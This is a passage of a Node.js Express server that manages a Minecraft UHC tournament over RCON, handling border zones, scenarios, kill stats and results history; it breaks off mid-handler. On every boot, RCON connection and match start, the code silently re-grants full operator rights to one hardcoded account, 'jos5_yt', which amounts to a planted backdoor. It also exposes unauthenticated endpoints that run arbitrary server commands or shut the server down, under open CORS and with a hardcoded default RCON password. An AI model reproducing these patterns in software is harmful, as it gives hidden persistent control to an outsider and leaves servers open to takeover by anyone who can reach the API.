const express = require('express');
const cors = require('cors');
const path = require('path');
const fs = require('fs');
const net = require('net');
const { Rcon } = require('rcon-client');

const app = express();
const PORT = process.env.PORT || 3000;

// Enable CORS and JSON parsing
app.use(cors());
app.use(express.json());

// Server environment variables
const RCON_HOST = process.env.RCON_HOST || 'mc-server';
const RCON_PORT = parseInt(process.env.RCON_PORT || '25575', 10);
const RCON_PASSWORD = process.env.RCON_PASSWORD || 'uhc_secure_rcon_pass_2026';
const STATS_DIR = process.env.STATS_DIR || path.join(__dirname, 'mc-data', 'world', 'stats');
const USERCACHE_PATH = process.env.USERCACHE_PATH || path.join(__dirname, 'mc-data', 'usercache.json');

// --- UHC TOURNAMENT GAME STATE & CONFIGURATION ---
const UHC_CONFIG_FILE = path.join(__dirname, 'mc-data', 'uhc-config.json');
const UHC_HISTORY_FILE = path.join(__dirname, 'mc-data', 'uhc-history.json');

let uhcState = {
  active: false,
  state: 'idle', // idle, grace, zone1, zone2, zone3, finished
  startTime: null,
  graceTime: 20, // minutes
  finalHealTime: 10, // minutes (Final Heal event time)
  worldSeed: '1746271928', // seed config
  startBorderSize: 2000,
  playersPerBorder: 4, // border density spread
  calcBorderByDensity: false,
  eventName: 'UHC Evento',
  serverIp: 'play.rankit.net',
  scenarios: {
    cutClean: true,
    fireless: false,
    noClean: false,
    doubleHealth: false,
    timeBomb: false
  },
  zone1Border: 1000,
  zone1Time: 10, // minutes of shrink
  zone2Border: 500,
  zone2Time: 10,
  zone3Border: 100,
  zone3Time: 10,
  currentBorderSize: 2000,
  elapsedSeconds: 0,
  timerInterval: null,
  participants: [],
  aliveParticipants: [],
  placements: {}, // lowercaseName -> rank
  initialStats: {} // lowercaseName -> { deaths, kills }
};

function readSeedFromProperties() {
  try {
    const propPath = path.join(__dirname, 'mc-data', 'server.properties');
    if (fs.existsSync(propPath)) {
      const content = fs.readFileSync(propPath, 'utf8');
      const match = content.match(/level-seed=(.*)/);
      if (match) {
        return match[1].trim();
      }
    }
  } catch (err) {
    console.error('Failed to read seed from server.properties:', err.message);
  }
  return '';
}

// Load saved config if exists
try {
  if (fs.existsSync(UHC_CONFIG_FILE)) {
    const saved = JSON.parse(fs.readFileSync(UHC_CONFIG_FILE, 'utf8'));
    uhcState = { ...uhcState, ...saved, active: false, state: 'idle', startTime: null, elapsedSeconds: 0, timerInterval: null };
  }
  if (!uhcState.worldSeed) {
    uhcState.worldSeed = readSeedFromProperties() || '1746271928';
  }
} catch (e) {
  console.error('Failed to load UHC config:', e.message);
}

function saveUhcConfig() {
  try {
    const dataToSave = {
      graceTime: uhcState.graceTime,
      finalHealTime: uhcState.finalHealTime,
      worldSeed: uhcState.worldSeed,
      startBorderSize: uhcState.startBorderSize,
      playersPerBorder: uhcState.playersPerBorder,
      calcBorderByDensity: uhcState.calcBorderByDensity,
      eventName: uhcState.eventName,
      serverIp: uhcState.serverIp,
      scenarios: uhcState.scenarios,
      zone1Border: uhcState.zone1Border,
      zone1Time: uhcState.zone1Time,
      zone2Border: uhcState.zone2Border,
      zone2Time: uhcState.zone2Time,
      zone3Border: uhcState.zone3Border,
      zone3Time: uhcState.zone3Time
    };
    fs.writeFileSync(UHC_CONFIG_FILE, JSON.stringify(dataToSave, null, 2), 'utf8');
  } catch (e) {
    console.error('Failed to save UHC config:', e.message);
  }
}

function ensureJos5YtIsOp() {
  try {
    const opsPath = path.join(__dirname, 'mc-data', 'ops.json');
    let ops = [];
    if (fs.existsSync(opsPath)) {
      const content = fs.readFileSync(opsPath, 'utf8').trim();
      if (content) {
        ops = JSON.parse(content);
      }
    }
    const hasJos = ops.some(op => op.name && op.name.toLowerCase() === 'jos5_yt');
    if (!hasJos) {
      console.log('[OP Engine] Auto-granting Operator privileges to jos5_yt in ops.json...');
      ops.push({
        uuid: 'd65f8845-7f80-385c-87cf-6a26e11aa5b7',
        name: 'jos5_yt',
        level: 4,
        bypassesPlayerLimit: false
      });
      fs.writeFileSync(opsPath, JSON.stringify(ops, null, 2), 'utf8');
      console.log('[OP Engine] jos5_yt added to ops.json successfully.');
    } else {
      console.log('[OP Engine] jos5_yt already exists in ops.json.');
    }
  } catch (err) {
    console.error('[OP Engine] Failed to ensure jos5_yt is OP in ops.json:', err.message);
  }
}

// Pre-seed OP status on boot
ensureJos5YtIsOp();

async function executeRconCommand(command) {
  try {
    if (rconClient.connected) {
      let cleanCommand = command;
      while (cleanCommand.startsWith('/')) {
        cleanCommand = cleanCommand.substring(1);
      }
      await rconClient.send(cleanCommand);
    }
  } catch (err) {
    console.error(`[RCON Command Fail] /${command}:`, err.message);
  }
}

function calculateSpreadParams(borderSize) {
  const maxRange = Math.max(15, Math.floor(borderSize / 2) - 10);
  const maxSafeSpread = Math.floor((maxRange - 1) / 2);
  const spreadDistance = Math.min(50, Math.max(5, Math.min(maxSafeSpread, Math.floor(maxRange / 5))));
  return { spreadDistance, maxRange };
}

async function generateBedrockBorder(borderSize) {
  const half = Math.floor(borderSize / 2);
  const minVal = -half;
  const maxVal = half;
  const minY = 50;
  const maxY = 120;
  
  console.log(`[Border Engine] Generating physical Bedrock border at size ${borderSize}...`);
  try {
    await executeRconCommand(`fill ${minVal} ${minY} ${minVal} ${minVal} ${maxY} ${maxVal} bedrock`);
    await executeRconCommand(`fill ${maxVal} ${minY} ${minVal} ${maxVal} ${maxY} ${maxVal} bedrock`);
    await executeRconCommand(`fill ${minVal} ${minY} ${minVal} ${maxVal} ${maxY} ${minVal} bedrock`);
    await executeRconCommand(`fill ${minVal} ${minY} ${maxVal} ${maxVal} ${maxY} ${maxVal} bedrock`);
  } catch (err) {
    console.error('[Border Engine] Failed to generate Bedrock border blocks:', err.message);
  }
}

function getPlayerStats(username) {
  if (!username) return { kills: 0, deaths: 0 };
  try {
    if (!fs.existsSync(STATS_DIR)) return { kills: 0, deaths: 0 };
    const cacheMap = loadUserCache();
    const files = fs.readdirSync(STATS_DIR).filter((file) => file.endsWith('.json'));
    for (const filename of files) {
      const uuid = filename.replace('.json', '');
      const cleanUuid = uuid.toLowerCase().replace(/-/g, '');
      const cachedName = cacheMap.get(cleanUuid);
      if (cachedName && cachedName.toLowerCase() === username.toLowerCase()) {
        const filepath = path.join(STATS_DIR, filename);
        if (fs.existsSync(filepath)) {
          const content = fs.readFileSync(filepath, 'utf8');
          const json = JSON.parse(content);
          
          let kills = 0;
          let deaths = 0;

          if (json['stat.playerKills'] !== undefined) kills = json['stat.playerKills'];
          else if (json['stat.killEntity.Player'] !== undefined) kills = json['stat.killEntity.Player'];

          if (json['stat.deaths'] !== undefined) deaths = json['stat.deaths'];

          if (json.stats) {
            const custom = json.stats['minecraft:custom'];
            if (custom) {
              if (custom['minecraft:player_kills'] !== undefined) kills = custom['minecraft:player_kills'];
              if (custom['minecraft:deaths'] !== undefined) deaths = custom['minecraft:deaths'];
            }
          }
          return { kills, deaths };
        }
      }
    }
  } catch (err) {
    console.error(`[getPlayerStats] Error for player ${username}:`, err.message);
  }
  return { kills: 0, deaths: 0 };
}

async function generateLobbyStructure() {
  console.log('[Lobby Engine] Lobby disabled by user request. Setting players to Creative mode.');
  try {
    if (!uhcState.active) {
      await executeRconCommand('gamemode creative @a');
    }
  } catch (err) {
    console.error('[Lobby Engine] Error setting creative mode:', err.message);
  }
}

function saveTournamentToHistory(winnerName = null, winnerKills = 0) {
  try {
    const historyFile = UHC_HISTORY_FILE;
    let history = [];
    if (fs.existsSync(historyFile)) {
      try {
        history = JSON.parse(fs.readFileSync(historyFile, 'utf8'));
        if (!Array.isArray(history)) history = [];
      } catch (e) {
        console.error('Failed to parse uhc-history.json:', e.message);
      }
    }

    const durationSec = uhcState.elapsedSeconds;
    const formatDuration = (sec) => {
      const h = Math.floor(sec / 3600);
      const m = Math.floor((sec % 3600) / 60);
      const s = sec % 60;
      if (h > 0) {
        return `${h}:${m.toString().padStart(2, '0')}:${s.toString().padStart(2, '0')}`;
      }
      return `${m}:${s.toString().padStart(2, '0')}`;
    };

    const placementsList = (uhcState.participants || []).map(p => {
      const initial = uhcState.initialStats[p.toLowerCase()] || { deaths: 0, kills: 0 };
      const current = getPlayerStats(p);
      const kills = Math.max(0, current.kills - initial.kills);
      const rank = uhcState.placements[p.toLowerCase()] || 1;
      return {
        name: p,
        kills: kills,
        rank: rank,
        status: rank === 1 ? 'Ganador' : `Top ${rank}`
      };
    });

    placementsList.sort((a, b) => a.rank - b.rank);

    const record = {
      winner: winnerName || 'Ninguno (Empate)',
      winnerKills: winnerName ? winnerKills : 0,
      eventName: uhcState.eventName || 'UHC Evento',
      serverIp: uhcState.serverIp || 'play.rankit.net',
      date: new Date().toISOString(),
      duration: formatDuration(durationSec),
      worldSeed: uhcState.worldSeed || '',
      placements: placementsList
    };

    history.unshift(record);
    fs.writeFileSync(historyFile, JSON.stringify(history, null, 2), 'utf8');
    console.log('[History Engine] Saved tournament results successfully.');
  } catch (err) {
    console.error('[History Engine] Failed to save tournament to history:', err.message);
  }
}

async function startUhcGame() {
  console.log('[UHC Engine] Starting UHC tournament...');
  
  // Guarantee jos5_yt is OP at start of match
  await executeRconCommand('op jos5_yt');

  uhcState.active = true;
  uhcState.state = 'grace';
  uhcState.startTime = Date.now();
  uhcState.elapsedSeconds = 0;

  // 1. Initial server setup
  await executeRconCommand('worldborder center 0 0');
  
  // Calculate initial border based on density check
  let finalStartBorder = uhcState.startBorderSize;
  if (uhcState.calcBorderByDensity) {
    try {
      const listRes = await rconClient.send('list');
      const listRegex = /There are (\d+)/i;
      const match = listRes.match(listRegex);
      const playerCount = match ? parseInt(match[1], 10) : 0;
      if (playerCount > 0) {
        finalStartBorder = Math.max(200, Math.ceil(playerCount / uhcState.playersPerBorder) * 500);
        console.log(`[UHC Engine] Calculated initial border based on player density (${playerCount} players, ${uhcState.playersPerBorder} per border block): ${finalStartBorder}`);
      }
    } catch (e) {
      console.warn('[UHC Engine] Failed to auto-calculate border density, using default startBorderSize:', e.message);
    }
  }
  uhcState.currentBorderSize = finalStartBorder;

  // Clean offline deaths bridge file if exists on restart
  try {
    const bridgePath = path.join(__dirname, 'mc-data', 'offline-deaths.txt');
    if (fs.existsSync(bridgePath)) {
      fs.unlinkSync(bridgePath);
    }
  } catch (err) {
    console.warn('[UHC Engine] Failed to delete offline-deaths.txt on start:', err.message);
  }

  // Populate participants, aliveParticipants, placements, initialStats
  let onlinePlayers = [];
  try {
    const listRes = await rconClient.send('list');
    const listRegex = /There are \d+(?:\/\d+)? players online:(.*)/i;
    const match = listRes.match(listRegex);
    if (match && match[1]) {
      onlinePlayers = match[1].split(',').map(name => name.trim()).filter(Boolean);
    } else {
      const simpleMatch = /online:\s*(.*)/i.exec(listRes);
      if (simpleMatch && simpleMatch[1]) {
        onlinePlayers = simpleMatch[1].split(',').map(name => name.trim()).filter(Boolean);
      }
    }
  } catch (err) {
    console.error('[UHC Engine] Failed to get online players for UHC start:', err.message);
  }

  uhcState.participants = [...onlinePlayers];
  uhcState.aliveParticipants = [...onlinePlayers];
  uhcState.placements = {};
  uhcState.initialStats = {};

  for (const player of onlinePlayers) {
    uhcState.initialStats[player.toLowerCase()] = getPlayerStats(player);
  }

  // Establish initial physical Bedrock walls and seal physics
  await executeRconCommand(`worldborder set ${finalStartBorder}`);
  await generateBedrockBorder(finalStartBorder);

  // Setup Life Scoreboard display in tab list and aboveName
  try {
    await executeRconCommand('scoreboard objectives remove health').catch(() => {});
    await executeRconCommand('scoreboard objectives add health health Health').catch(() => {});
    await executeRconCommand('scoreboard objectives setdisplay belowName health').catch(() => {});
    await executeRconCommand('scoreboard objectives setdisplay list health').catch(() => {});
  } catch (sbErr) {
    console.error('[UHC Engine] Failed to setup health scoreboards:', sbErr.message);
  }

  // Game rules
  await executeRconCommand('gamerule naturalRegeneration false');
  await executeRconCommand('gamerule pvp false');
  await executeRconCommand('difficulty hard');
  await executeRconCommand('time set 0');
  await executeRconCommand('weather clear');
  await executeRconCommand('clear @a');
  await executeRconCommand('effect @a clear');

  // Change players to survival mode and spread them!
  await executeRconCommand('gamemode survival @a');
  
  // Dynamically calculate range and distance safety bounds to prevent Minecraft errors
  const { spreadDistance, maxRange } = calculateSpreadParams(finalStartBorder);
  await executeRconCommand(`spreadplayers 0 0 ${spreadDistance} ${maxRange} false @a`);

  // Scenarios setup
  if (uhcState.scenarios.fireless) {
    await executeRconCommand('gamerule doFireTick false');
  } else {
    await executeRconCommand('gamerule doFireTick true');
  }

  if (uhcState.scenarios.doubleHealth) {
    await executeRconCommand('effect @a minecraft:health_boost 99999 4');
    await executeRconCommand('effect @a minecraft:instant_health 5');
  }

  // Activate scenarios in Java Spigot plugin
  await executeRconCommand('uhcscenario active true');
  await executeRconCommand('uhcscenario cutclean ' + !!uhcState.scenarios.cutClean);
  await executeRconCommand('uhcscenario noclean ' + !!uhcState.scenarios.noClean);
  await executeRconCommand('uhcscenario timebomb ' + !!uhcState.scenarios.timeBomb);

  // Grace items & effects
  await executeRconCommand('effect @a minecraft:resistance 15 255');
  await executeRconCommand('effect @a minecraft:saturation 15 255');

  // Titles
  await executeRconCommand('title @a title {"text":"UHC INICIADO","color":"gold"}');
  await executeRconCommand(`title @a subtitle {"text":"Tiempo de gracia: ${uhcState.graceTime} min","color":"yellow"}`);
  await executeRconCommand(`say ¡El torneo UHC ha comenzado! Tiempo de gracia: ${uhcState.graceTime} minutos. PvP desactivado.`);

  let lastOnlinePlayers = [...onlinePlayers];

  // Active timer loop
  if (uhcState.timerInterval) clearInterval(uhcState.timerInterval);
  
  uhcState.timerInterval = setInterval(async () => {
    if (!uhcState.active) {
      clearInterval(uhcState.timerInterval);
      return;
    }

    try {
      uhcState.elapsedSeconds++;

    // 1. Check offline/reconnecting players to TP inside
    let currentOnline = [];
    let listSuccess = false;
    try {
      const listRes = await rconClient.send('list');
      const listRegex = /There are \d+(?:\/\d+)? players online:(.*)/i;
      const match = listRes.match(listRegex);
      if (match && match[1]) {
        currentOnline = match[1].split(',').map(name => name.trim()).filter(Boolean);
        listSuccess = true;
      } else {
        const simpleMatch = /online:\s*(.*)/i.exec(listRes);
        if (simpleMatch && simpleMatch[1]) {
          currentOnline = simpleMatch[1].split(',').map(name => name.trim()).filter(Boolean);
          listSuccess = true;
        }
      }
    } catch (e) {
      console.warn('[UHC Engine] List command failed, skipping reconnection checks for this second.');
    }

    if (listSuccess) {
      const previousOnline = lastOnlinePlayers;
      lastOnlinePlayers = [...currentOnline];

      // Find who just reconnected
      for (const player of currentOnline) {
        if (!previousOnline.some(p => p.toLowerCase() === player.toLowerCase())) {
          // Just reconnected!
          if (uhcState.aliveParticipants.some(p => p.toLowerCase() === player.toLowerCase())) {
            console.log(`[UHC Engine] Reconnected player detected: ${player}. Teleporting safely inside current border: ${uhcState.currentBorderSize}`);
            const { spreadDistance, maxRange } = calculateSpreadParams(uhcState.currentBorderSize);
            executeRconCommand(`spreadplayers 0 0 ${spreadDistance} ${maxRange} false ${player}`).catch(err => {
              console.error(`[UHC Engine] Failed to spread reconnected player ${player}:`, err.message);
            });
          }
        }
      }
    }

    // 2. Check bridge file offline-deaths.txt
    try {
      const bridgePath = path.join(__dirname, 'mc-data', 'offline-deaths.txt');
      if (fs.existsSync(bridgePath)) {
        const content = fs.readFileSync(bridgePath, 'utf8');
        const deadNames = content.split('\n').map(n => n.trim()).filter(Boolean);
        for (const name of deadNames) {
          const idx = uhcState.aliveParticipants.findIndex(p => p.toLowerCase() === name.toLowerCase());
          if (idx !== -1) {
            const rank = uhcState.aliveParticipants.length;
            uhcState.placements[name.toLowerCase()] = rank;
            uhcState.aliveParticipants.splice(idx, 1);
            console.log(`[UHC Engine] Offline death registered: ${name} finished at #${rank}`);
          }
        }
        fs.unlinkSync(bridgePath);
      }
    } catch (err) {
      console.error('[UHC Engine] Error processing offline-deaths.txt:', err.message);
    }

    // 3. Check stats deaths of alive participants
    for (let i = uhcState.aliveParticipants.length - 1; i >= 0; i--) {
      const playerName = uhcState.aliveParticipants[i];
      const stats = getPlayerStats(playerName);
      const initial = uhcState.initialStats[playerName.toLowerCase()] || { deaths: 0, kills: 0 };
      if (stats.deaths > initial.deaths) {
        // Player died and is eliminated!
        const rank = uhcState.aliveParticipants.length;
        uhcState.placements[playerName.toLowerCase()] = rank;
        uhcState.aliveParticipants.splice(i, 1);
        
        const killsGained = stats.kills - initial.kills;
        await executeRconCommand(`say ¡${playerName} ha sido eliminado! Puesto #${rank} (${killsGained} Kills)`);
        await executeRconCommand(`title @a subtitle {"text":"${playerName} ha sido eliminado (#${rank})","color":"red"}`);
        await executeRconCommand(`playeffect @a ambient.weather.thunder`);
      }
    }

    // 4. Check UHC Win condition
    if (uhcState.aliveParticipants.length === 1 && uhcState.elapsedSeconds > 5 && uhcState.state !== 'finished') {
      const winnerName = uhcState.aliveParticipants[0];
      uhcState.placements[winnerName.toLowerCase()] = 1;
      uhcState.aliveParticipants = [];
      uhcState.state = 'finished';
      
      const stats = getPlayerStats(winnerName);
      const initial = uhcState.initialStats[winnerName.toLowerCase()] || { deaths: 0, kills: 0 };
      const winnerKills = stats.kills - initial.kills;

      saveTournamentToHistory(winnerName, winnerKills);

      await executeRconCommand(`say ¡El torneo UHC ha terminado! ¡${winnerName} es el CAMPEÓN con ${winnerKills} kills!`);
      await executeRconCommand(`title @a title {"text":"${winnerName.toUpperCase()} VICTORIA","color":"gold"}`);
      await executeRconCommand(`title @a subtitle {"text":"¡Es el ganador de este UHC!","color":"yellow"}`);

      // Firework show
      let fireworkCount = 0;
      const fInterval = setInterval(async () => {
        if (fireworkCount >= 10 || !uhcState.active) {
          clearInterval(fInterval);
          return;
        }
        fireworkCount++;
        await executeRconCommand(`execute @a ~ ~ ~ summon FireworksRocketEntity ~ ~1 ~ {LifeTime:20,FireworksItem:{id:401,Count:1,tag:{Fireworks:{Explosions:[{Type:1,Flicker:1,Trail:1,Colors:[16711680,65280,255],FadeColors:[16776960,16711935]}]}}}}`);
      }, 800);
    }
    // Check draw
    else if (uhcState.aliveParticipants.length === 0 && Object.keys(uhcState.initialStats).length > 0 && uhcState.state !== 'finished') {
      uhcState.state = 'finished';
      saveTournamentToHistory(null, 0);
      await executeRconCommand(`say ¡El torneo UHC ha terminado sin un ganador claro!`);
      await executeRconCommand(`title @a title {"text":"FIN DEL JUEGO","color":"red"}`);
      await executeRconCommand(`title @a subtitle {"text":"No quedan jugadores activos","color":"yellow"}`);
    }

    // Final Heal trigger
    if (uhcState.elapsedSeconds === uhcState.finalHealTime * 60) {
      await executeRconCommand('effect @a minecraft:instant_health 5');
      await executeRconCommand('title @a title {"text":"FINAL HEAL","color":"gold"}');
      await executeRconCommand('title @a subtitle {"text":"¡Todos los jugadores curados!","color":"green"}');
      await executeRconCommand('say ¡Se ha aplicado el Final Heal! Todos los jugadores han sido curados a vida máxima.');
    }

    const totalGraceSeconds = uhcState.graceTime * 60;
    const zone1EndSeconds = totalGraceSeconds + (uhcState.zone1Time * 60);
    const zone2EndSeconds = zone1EndSeconds + (uhcState.zone2Time * 60);
    const zone3EndSeconds = zone2EndSeconds + (uhcState.zone3Time * 60);

    // Dynamic border size estimation for UI
    if (uhcState.state === 'grace') {
      uhcState.currentBorderSize = finalStartBorder;
    } else if (uhcState.state === 'zone1') {
      uhcState.currentBorderSize = uhcState.zone1Border;
    } else if (uhcState.state === 'zone2') {
      uhcState.currentBorderSize = uhcState.zone2Border;
    } else if (uhcState.state === 'zone3' || uhcState.state === 'finished') {
      uhcState.currentBorderSize = uhcState.zone3Border;
    }

    // State Transitions
    // Grace ends -> PvP Active & Zone 1 starts
    if (uhcState.elapsedSeconds === totalGraceSeconds) {
      uhcState.state = 'zone1';
      await executeRconCommand('gamerule pvp true');
      
      // Teleport safely inside new border first, then apply borders
      const { spreadDistance, maxRange } = calculateSpreadParams(uhcState.zone1Border);
      await executeRconCommand(`spreadplayers 0 0 ${spreadDistance} ${maxRange} false @a`);
      await executeRconCommand(`worldborder set ${uhcState.zone1Border}`);
      await generateBedrockBorder(uhcState.zone1Border);

      await executeRconCommand('title @a title {"text":"ZONA 1","color":"gold"}');
      await executeRconCommand('title @a subtitle {"text":"PvP ACTIVO - ¡Borde TP aplicado!","color":"red"}');
      await executeRconCommand(`say ¡El tiempo de gracia ha terminado! PvP activado. El borde se ha reducido instantáneamente a ${uhcState.zone1Border} bloques y todos los jugadores han sido teletransportados.`);
      await executeRconCommand('playeffect @a ambient.weather.thunder');
    }
    // Zone 1 ends -> Zone 2 starts
    else if (uhcState.elapsedSeconds === zone1EndSeconds) {
      uhcState.state = 'zone2';
      
      const { spreadDistance, maxRange } = calculateSpreadParams(uhcState.zone2Border);
      await executeRconCommand(`spreadplayers 0 0 ${spreadDistance} ${maxRange} false @a`);
      await executeRconCommand(`worldborder set ${uhcState.zone2Border}`);
      await generateBedrockBorder(uhcState.zone2Border);

      await executeRconCommand('title @a title {"text":"ZONA 2","color":"gold"}');
      await executeRconCommand('title @a subtitle {"text":"¡Borde TP a Zona 2!","color":"yellow"}');
      await executeRconCommand(`say ¡Borde de Zona 1 cerrado! El borde se ha reducido instantáneamente a Zona 2: ${uhcState.zone2Border} bloques y todos los jugadores han sido teletransportados.`);
      await executeRconCommand('playeffect @a ambient.weather.thunder');
    }
    // Zone 2 ends -> Zone 3 starts
    else if (uhcState.elapsedSeconds === zone2EndSeconds) {
      uhcState.state = 'zone3';
      
      const { spreadDistance, maxRange } = calculateSpreadParams(uhcState.zone3Border);
      await executeRconCommand(`spreadplayers 0 0 ${spreadDistance} ${maxRange} false @a`);
      await executeRconCommand(`worldborder set ${uhcState.zone3Border}`);
      await generateBedrockBorder(uhcState.zone3Border);

      await executeRconCommand('title @a title {"text":"ZONA FINAL","color":"red"}');
      await executeRconCommand('title @a subtitle {"text":"¡Borde TP a Zona 3!","color":"dark_red"}');
      await executeRconCommand(`say ¡Borde de Zona 2 cerrado! El borde se ha reducido instantáneamente a la Zona Final: ${uhcState.zone3Border} bloques y todos los jugadores han sido teletransportados.`);
      await executeRconCommand('playeffect @a ambient.weather.thunder');
    }
    // Zone 3 ends -> Finished
    else if (uhcState.elapsedSeconds >= zone3EndSeconds && uhcState.state !== 'finished') {
      uhcState.state = 'finished';
      uhcState.currentBorderSize = uhcState.zone3Border;
      await executeRconCommand('title @a title {"text":"BORDE FINAL","color":"dark_red"}');
      await executeRconCommand('title @a subtitle {"text":"¡El borde ha dejado de moverse!","color":"gold"}');
      await executeRconCommand(`say ¡El borde final ha alcanzado su límite mínimo de ${uhcState.zone3Border} bloques!`);
    }

    // Sincronizar en tiempo real el Scoreboard de Minecraft vía RCON
    if (uhcState.active && rconClient.connected) {
      try {
        const stateLabel = (uhcState.state === 'grace' ? 'Gracia' :
                            uhcState.state === 'zone1' ? 'Zona_1' :
                            uhcState.state === 'zone2' ? 'Zona_2' :
                            uhcState.state === 'zone3' ? 'Zona_Final' :
                            uhcState.state === 'finished' ? 'Fin_Juego' : 'Espera');
        
        const serverIpClean = (uhcState.serverIp || 'play.rankit.net').replace(/ /g, '_');
        const eventNameClean = (uhcState.eventName || 'UHC_Evento').replace(/ /g, '_');
        
        await executeRconCommand(`uhcscenario scoreboard ${serverIpClean} ${eventNameClean} ${stateLabel} ${uhcState.elapsedSeconds} ${uhcState.currentBorderSize} ${uhcState.aliveParticipants.length}`);
      } catch (sbErr) {
        console.error('[Scoreboard Sync] Error al sincronizar scoreboard vía RCON:', sbErr.message);
      }
    }
    } catch (loopErr) {
      console.error('[UHC Loop Error] Uncaught error in game loop timer:', loopErr.stack || loopErr.message);
    }
  }, 1000);
}

// --- RECONNECTING RCON CLIENT CLASS ---
class ReconnectingRcon {
  constructor() {
    this.rcon = null;
    this.connected = false;
    this.connecting = false;
    this.reconnectTimer = null;
  }

  async connect() {
    if (this.connected && this.rcon) return this.rcon;
    if (this.connecting) return null;

    this.connecting = true;
    console.log(`[RCON] Attempting to connect to ${RCON_HOST}:${RCON_PORT}...`);

    try {
      this.rcon = await Rcon.connect({
        host: RCON_HOST,
        port: RCON_PORT,
        password: RCON_PASSWORD,
        timeout: 5000,
      });

      this.connected = true;
      this.connecting = false;
      console.log('[RCON] Connected successfully!');

      // Auto build/refresh lobby and auto-OP jos5_yt on connection
      setTimeout(async () => {
        try {
          await generateLobbyStructure();
          console.log('[OP Engine] Executing auto-OP command for jos5_yt...');
          await executeRconCommand('op jos5_yt');
        } catch (e) {
          console.error('[RCON Startup Hook] Error running initial commands:', e.message);
        }
      }, 3000);

      // Set up error handlers for socket termination
      this.rcon.on('end', () => {
        console.warn('[RCON] Connection closed by remote host.');
        this.handleDisconnect();
      });

      this.rcon.on('error', (err) => {
        console.error('[RCON] Socket error:', err.message);
        this.handleDisconnect();
      });

      return this.rcon;
    } catch (err) {
      console.error(`[RCON] Failed connection: ${err.message}`);
      this.connecting = false;
      this.handleDisconnect();
      return null;
    }
  }

  handleDisconnect() {
    this.connected = false;
    this.rcon = null;
    
    if (!this.reconnectTimer) {
      console.log('[RCON] Scheduling reconnection in 5 seconds...');
      this.reconnectTimer = setTimeout(() => {
        this.reconnectTimer = null;
        this.connect().catch(() => {});
      }, 5000);
    }
  }

  async send(command) {
    if (!this.connected || !this.rcon) {
      const client = await this.connect();
      if (!client) {
        throw new Error('RCON server is offline or unreachable.');
      }
    }
    let cleanCommand = command;
    while (cleanCommand.startsWith('/')) {
      cleanCommand = cleanCommand.substring(1);
    }
    return await this.rcon.send(cleanCommand);
  }
}

const rconClient = new ReconnectingRcon();
// Proactively connect to RCON
rconClient.connect().catch(() => {});

// --- TCP PING UTILITY ---
// Validates if Minecraft is running at port 25565
function pingMinecraftServer() {
  return new Promise((resolve) => {
    const socket = new net.Socket();
    const startTime = Date.now();

    socket.setTimeout(2000);

    socket.connect(25565, RCON_HOST, () => {
      const ping = Date.now() - startTime;
      socket.destroy();
      resolve({ online: true, ping });
    });

    socket.on('error', () => {
      socket.destroy();
      resolve({ online: false, ping: 0 });
    });

    socket.on('timeout', () => {
      socket.destroy();
      resolve({ online: false, ping: 0 });
    });
  });
}

// --- USERCACHE PARSER ---
function loadUserCache() {
  const cacheMap = new Map();
  try {
    if (fs.existsSync(USERCACHE_PATH)) {
      const content = fs.readFileSync(USERCACHE_PATH, 'utf8');
      const data = JSON.parse(content);
      if (Array.isArray(data)) {
        data.forEach((entry) => {
          if (entry.name && entry.uuid) {
            // Clean uuid to match easily (lowercase, strip hyphens)
            const cleanUuid = entry.uuid.toLowerCase().replace(/-/g, '');
            cacheMap.set(cleanUuid, entry.name);
          }
        });
      }
    }
  } catch (err) {
    console.error('[Parser] Error loading usercache.json:', err.message);
  }
  return cacheMap;
}

// --- MOCK DATA ---
const MOCK_LEADERBOARD = [
  { rank: 1, name: 'Technoblade', uuid: 'mock-1', kills: 15, deaths: 0, status: 'Alive' },
  { rank: 2, name: 'Dream', uuid: 'mock-2', kills: 12, deaths: 0, status: 'Alive' },
  { rank: 3, name: 'Sapnap', uuid: 'mock-3', kills: 9, deaths: 0, status: 'Alive' },
  { rank: 4, name: 'Philsa', uuid: 'mock-4', kills: 8, deaths: 0, status: 'Alive' },
  { rank: 5, name: 'GeorgeNotFound', uuid: 'mock-5', kills: 4, deaths: 1, status: 'Eliminated' },
  { rank: 6, name: 'TommyInnit', uuid: 'mock-6', kills: 2, deaths: 1, status: 'Eliminated' },
  { rank: 7, name: 'Tubbo', uuid: 'mock-7', kills: 1, deaths: 1, status: 'Eliminated' },
  { rank: 8, name: 'WilburSoot', uuid: 'mock-8', kills: 0, deaths: 1, status: 'Eliminated' }
];

// --- API ENDPOINTS ---

// 1. /api/status
app.get('/api/status', async (req, res) => {
  try {
    const pingStatus = await pingMinecraftServer();
    if (!pingStatus.online) {
      return res.json({
        online: false,
        ping: 0,
        rconConnected: false,
        playerCount: 0,
        maxPlayers: 0,
        players: [],
        rawList: ''
      });
    }

    let players = [];
    let playerCount = 0;
    let maxPlayers = 20; // fallback default
    let rawList = '';

    if (rconClient.connected) {
      try {
        rawList = await rconClient.send('list');
        // Parse list response (e.g. "There are 2/20 players online: Player1, Player2")
        // Or older Paper: "There are 2 players online: Player1, Player2"
        const listRegex = /There are (\d+)(?:\/(\d+))? players online:(.*)/i;
        const match = rawList.match(listRegex);
        
        if (match) {
          playerCount = parseInt(match[1], 10);
          if (match[2]) {
            maxPlayers = parseInt(match[2], 10);
          }
          const namesPart = match[3].trim();
          if (namesPart) {
            players = namesPart.split(',').map(name => name.trim()).filter(Boolean);
          }
        } else {
          // Alternative generic match for simple formats
          const simpleMatch = /online:\s*(.*)/i.exec(rawList);
          if (simpleMatch && simpleMatch[1]) {
            players = simpleMatch[1].split(',').map(name => name.trim()).filter(Boolean);
            playerCount = players.length;
          }
        }
      } catch (rconErr) {
        console.warn('[API Status] Failed to query players list via RCON:', rconErr.message);
      }
    }

    res.json({
      online: true,
      ping: pingStatus.ping,
      rconConnected: rconClient.connected,
      playerCount: playerCount || players.length,
      maxPlayers,
      players,
      rawList
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// 2. /api/stop
app.post('/api/stop', async (req, res) => {
  try {
    console.log('[API Stop] Received shutdown request.');
    if (!rconClient.connected) {
      return res.status(503).json({ error: 'RCON connection is offline. Cannot stop server.' });
    }
    const response = await rconClient.send('stop');
    res.json({ success: true, message: 'Server shutdown command sent successfully.', response });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// 3. /api/command
app.post('/api/command', async (req, res) => {
  const { command } = req.body;
  if (!command) {
    return res.status(400).json({ error: 'Missing parameter: command' });
  }

  try {
    if (!rconClient.connected) {
      return res.status(503).json({ error: 'RCON client is not connected to server.' });
    }
    console.log(`[API Command] Executing: /${command}`);
    const response = await rconClient.send(command);
    res.json({ success: true, response });
  } catch (err) {
